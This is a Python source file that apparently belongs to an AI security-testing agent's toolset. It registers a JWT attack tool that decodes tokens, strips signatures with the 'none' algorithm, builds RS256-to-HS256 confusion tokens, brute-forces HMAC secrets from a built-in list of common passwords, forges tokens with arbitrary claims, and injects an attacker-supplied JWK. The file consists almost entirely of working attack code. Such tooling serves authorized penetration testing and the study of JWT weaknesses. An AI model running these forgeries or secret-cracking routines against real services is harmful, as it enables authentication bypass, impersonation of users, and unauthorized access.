"""JWT Security Toolkit for advanced JWT attacks."""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
from typing import Any, Literal

from strix.tools.registry import register_tool


JWTToolkitAction = Literal[
    "decode",
    "none_attack",
    "alg_confusion",
    "crack_secret",
    "forge_token",
    "jwk_injection",
]


def _base64url_decode(data: str) -> bytes:
    """Decode base64url encoded data."""
    padding = 4 - len(data) % 4
    if padding != 4:
        data += "=" * padding
    return base64.urlsafe_b64decode(data)


def _base64url_encode(data: bytes) -> str:
    """Encode data as base64url without padding."""
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def _decode_jwt(token: str) -> tuple[dict[str, Any], dict[str, Any], str]:
    """Decode JWT into header, payload, and signature."""
    parts = token.split(".")
    if len(parts) != 3:
        raise ValueError(f"Invalid JWT format: expected 3 parts, got {len(parts)}")

    header = json.loads(_base64url_decode(parts[0]))
    payload = json.loads(_base64url_decode(parts[1]))
    signature = parts[2]

    return header, payload, signature


def _create_jwt(header: dict[str, Any], payload: dict[str, Any], secret: str = "") -> str:
    """Create JWT from header and payload."""
    header_b64 = _base64url_encode(json.dumps(header).encode())
    payload_b64 = _base64url_encode(json.dumps(payload).encode())

    unsigned_token = f"{header_b64}.{payload_b64}"

    alg = header.get("alg", "none").upper()

    if alg == "NONE" or not secret:
        return f"{unsigned_token}."

    if alg.startswith("HS"):
        # HMAC signature
        if alg == "HS256":
            signature = hmac.new(secret.encode(), unsigned_token.encode(), hashlib.sha256).digest()
        elif alg == "HS384":
            signature = hmac.new(secret.encode(), unsigned_token.encode(), hashlib.sha384).digest()
        elif alg == "HS512":
            signature = hmac.new(secret.encode(), unsigned_token.encode(), hashlib.sha512).digest()
        else:
            raise ValueError(f"Unsupported algorithm: {alg}")

        signature_b64 = _base64url_encode(signature)
        return f"{unsigned_token}.{signature_b64}"

    return f"{unsigned_token}."


@register_tool
def jwt_toolkit(
    action: JWTToolkitAction,
    token: str | None = None,
    secret: str | None = None,
    claims: dict[str, Any] | None = None,
    algorithm: str | None = None,
    wordlist: list[str] | None = None,
) -> dict[str, Any]:
    """JWT Security Toolkit for JWT attacks and manipulation.

    Advanced JWT testing including algorithm confusion, none attack,
    secret cracking, token forgery, and JWK injection.

    Args:
        action: The JWT attack to perform:
            - decode: Decode and analyze JWT
            - none_attack: Create JWT with 'none' algorithm
            - alg_confusion: Test RS256->HS256 confusion
            - crack_secret: Brute force HMAC secret
            - forge_token: Create forged token with custom claims
            - jwk_injection: Create token with injected JWK
        token: JWT token to manipulate
        secret: Secret key for signing/verification
        claims: Custom claims for forged token
        algorithm: Algorithm to use for token creation
        wordlist: Wordlist for secret cracking

    Returns:
        Results of JWT attack including manipulated tokens
    """
    try:
        if action == "decode":
            if not token:
                return {"error": "token required for decode action"}

            header, payload, signature = _decode_jwt(token)

            analysis = {
                "header": header,
                "payload": payload,
                "signature": signature,
                "algorithm": header.get("alg", "unknown"),
                "security_notes": [],
            }

            alg = header.get("alg", "").upper()

            if alg in ("NONE", ""):
                analysis["security_notes"].append({
                    "severity": "critical",
                    "issue": "None algorithm - no signature verification",
                })

            if "jku" in header:
                analysis["security_notes"].append({
                    "severity": "high",
                    "issue": f"JKU header present: {header['jku']} - potential key injection",
                })

            if "kid" in header:
                analysis["security_notes"].append({
                    "severity": "medium",
                    "issue": f"KID header: {header['kid']} - test for path traversal",
                })

            if alg.startswith("HS"):
                analysis["security_notes"].append({
                    "severity": "medium",
                    "issue": "HMAC algorithm - try secret brute force",
                })

            return analysis

        if action == "none_attack":
            if not token:
                return {"error": "token required for none_attack action"}

            header, payload, _ = _decode_jwt(token)

            # Create token with none algorithm
            header["alg"] = "none"
            none_token = _create_jwt(header, payload, "")

            return {
                "original_token": token,
                "none_token": none_token,
                "description": "Token with 'none' algorithm - no signature",
                "test_instructions": "Try using this token - if accepted, no signature verification",
            }

        if action == "alg_confusion":
            if not token:
                return {"error": "token required for alg_confusion action"}

            header, payload, _ = _decode_jwt(token)

            # RS256 -> HS256 confusion
            confused_tokens = []

            if header.get("alg", "").upper().startswith("RS"):
                # Change to HS256
                header["alg"] = "HS256"
                # Note: In real attack, would use public key as HMAC secret
                confused_token = _create_jwt(header, payload, secret or "public_key_here")

                confused_tokens.append({
                    "type": "RS256_to_HS256",
                    "token": confused_token,
                    "description": "Algorithm changed to HS256 - use public key as HMAC secret",
                })

            return {
                "original_algorithm": header.get("alg"),
                "confused_tokens": confused_tokens,
                "description": "Algorithm confusion attack - try with public key as secret",
            }

        if action == "crack_secret":
            if not token:
                return {"error": "token required for crack_secret action"}

            header, payload, signature = _decode_jwt(token)
            alg = header.get("alg", "").upper()

            if not alg.startswith("HS"):
                return {"error": "Token does not use HMAC algorithm"}

            # Use provided wordlist or default common secrets
            test_secrets = wordlist or [
                "secret",
                "password",
                "123456",
                "admin",
                "key",
                "jwt_secret",
                "your-256-bit-secret",
                "",
            ]

            for test_secret in test_secrets:
                try:
                    # Create token with test secret
                    test_token = _create_jwt(header, payload, test_secret)

                    # Compare signatures
                    if token.split(".")[-1] == test_token.split(".")[-1]:
                        return {
                            "found": True,
                            "secret": test_secret,
                            "algorithm": alg,
                            "message": f"Secret found: {test_secret}",
                        }
                except Exception:
                    continue

            return {
                "found": False,
                "tested_secrets": len(test_secrets),
                "message": "Secret not found in wordlist",
                "recommendation": "Try larger wordlist or dictionary attack",
            }

        if action == "forge_token":
            if not claims:
                return {"error": "claims required for forge_token action"}

            # Create custom header
            header = {
                "alg": algorithm or "HS256",
                "typ": "JWT",
            }

            forged_token = _create_jwt(header, claims, secret or "")

            return {
                "forged_token": forged_token,
                "header": header,
                "claims": claims,
                "description": "Forged JWT with custom claims",
            }

        if action == "jwk_injection":
            if not token:
                return {"error": "token required for jwk_injection action"}

            header, payload, _ = _decode_jwt(token)

            # Create malicious JWK
            malicious_jwk = {
                "kty": "oct",
                "k": _base64url_encode(b"malicious_secret"),
            }

            # Inject JWK into header
            header["jwk"] = malicious_jwk
            header["alg"] = "HS256"

            jwk_token = _create_jwt(header, payload, "malicious_secret")

            return {
                "jwk_token": jwk_token,
                "injected_jwk": malicious_jwk,
                "description": "Token with injected JWK - if server uses embedded JWK, signature verified with attacker's key",
            }

        return {"error": f"Unknown action: {action}"}

    except (ValueError, KeyError, json.JSONDecodeError) as e:
        return {"error": f"JWT toolkit operation failed: {e!s}"}
